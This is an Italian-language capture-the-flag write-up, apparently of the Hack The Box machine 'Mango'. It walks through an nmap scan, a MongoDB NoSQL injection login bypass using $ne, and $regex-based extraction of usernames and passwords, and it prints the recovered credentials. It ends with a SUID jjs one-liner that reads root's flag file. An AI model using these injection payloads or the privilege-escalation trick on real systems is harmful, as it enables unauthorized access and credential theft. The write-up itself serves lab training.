@@ -1,0 +1,155 @@
+1) come sempre inizio con nmap:
+
+nmap -sC -sV  10.10.10.162 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 11:48 CEST
+Nmap scan report for 10.10.10.162
+Host is up (0.14s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+c'è un server http (80) e un server https (443)
+
+
+
+2) il server sulla porta 80 non risulta accesibile, mentre quello sulla porta 443 restituisce
+un motore di ricerca (non funzionante)) con una serie di statistiche
+il browser segnala un errore con il certificato. 
+esaminando il certificato si vede che all'interno c'è:
+    Common Name staging-order.mango.htb (restituito anche da nmap)
+quindi c'è un host con questo nome, per raggiungerlo lo aggiungo al file host:
+    10.10.10.162    staging-order.mango.htb
+
+ora andando all'url staging-order.mango.htb si ottiene una pagina di login.
+
+
+
+3)provando a fare login e intercept con burpsuite si ottiene:
+
+POST / HTTP/1.1
+Host: staging-order.mango.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://staging-order.mango.htb/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+Origin: http://staging-order.mango.htb
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=dbkkkr9rraqnrdv28pn94ve38f
+Upgrade-Insecure-Requests: 1
+
+username=abc&password=def&login=login
+
+si vede che il sito usa php, tra l'altro il nome suggerisce che viene usato mongodb
+
+
+un primo tentativo è quello di usar ocme login:
+username[]=admin&password[]=def&login=login
+
+questo comporta l'uso di array in php al posto di valori singoli e se c'è qualche errore nella pagina
+si riuscirà ad ottenere qualcosa. Questa tecnica però in questo caso non va a buon fine.
+
+però si può provare un exploit per nosql (che è usato da mongodb), cioè l'operatore $ne (not equal)
+possiamo passarlo a php tramite lòa sintassi per l'array:
+
+username=admin&password[$ne]=abc&login=login
+
+questo cambia la query:
+    db.users.find({ username: "admin", password: "abc" });
+in:
+    db.users.find({ username: "admin", password: { $ne : "abc" } });
+    
+che restituisce true in quanto la password per admin è effettivamente diversa da 'abc'
+effettivamente in questo modo si riesce ad accedere
+
+
+
+4)la pagina ottenuta contiene solo un messaggio:
+
+Under Plantation
+Sorry for the inconvenience. We just started farming!
+o contact us in the meantime please email: admin@mango.htb
+We rarely look at our inboxes.
+
+quindi questa pagina non contiene niente di interessante, nonostante questo 
+si può provare a ottenere qualche info dal db attraverso l'injection, come prima.
+In particolare può essere utile l'operatore $regex che permette di trovare dati usando le regular
+expressions:
+    db.users.find({ username: { $regex : "a.*", password: { $ne : "admin" } });
+
+per farlo nella richiesta http inviamo:
+
+    username[$regex]=a.*&password[$regex]=a.*&login=login
+    
+Usando a.* si ottiene 302 - FOUND perchè esistono usernames con la a (admin)
+mentre provandoa d esempio con b.* si ottiene 200 OK quindi non ci sono usernames con la b
+
+
+
+5) a questo punto quindi è possibile creare uno script che permette di scoprire altri usernames 
+che poi possono essere usati per accedere come con admin usando $ne
+script -> usernames.py
+ottengo:
+['admin', 'mango']
+quindi provo a fare l'accesso con 'mango' e ottengo la stessa pagina, a questo punto 
+posso fare un altro script con la stessa logica per trovare le password 
+divido lo script in due:
+    1- trova caratteri validi (find_values_pw.py)
+        valid mango:
+       ['3', '5', '8', 'f', 'h', 'm', 'H', 'K', 'R', 'U', 'X', '$', '.', '\\', ']', '^', '{', '|', '~']
+        valid admin:
+        ['0', '2', '3', '9', 'c', 't', 'B', 'K', 'S', '!', '#', '$', '.', '>', '\\', '^', '|']
+      
+   2- sfruttando i valori validi triovati, cerca la pw. -> password.py
+    admin:t9KcS3>!0B#2
+    mango:h3mXK8RhU~f{]f5H
+    
+6) ora con user e pass di entrambi, posso provare se le credenziali vanno bene per ssh 
+per mango funzionano quindi ora ho shell ssh con user mango
+posso evdere subito che user.txt è nella home di admin con permessi dell'user admin quindi devo prendere l'user admin per aprirlo
+visto che ho una password per admin posso provare a cambiare semplicemente utente con 
+su - admin
+e effettivamente funziona quindi ora ho accesso a user.txt:
+    79bf31c6c6eb38a8567832f7f8b47e92
+    
+    
+7) provo a cercare tutti i files con permessi suid (permessi di esecuzione come root da qualsaisi utente) con:
+     find . -perm /4000     -> 4000 indica i permessi suid (contiene una s al posto della x)
+     tra quelli trovati sono interessanti:
+     ./usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+     ./usr/bin/run-mailcap
+che secondo gtfo-bins possono essere usati per una privesc, usando :
+
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+
+è possibile leggere il file root.txt:
+
+8a8ef79a7a2fbb01ea81688424e9ab15
+
+
+
+
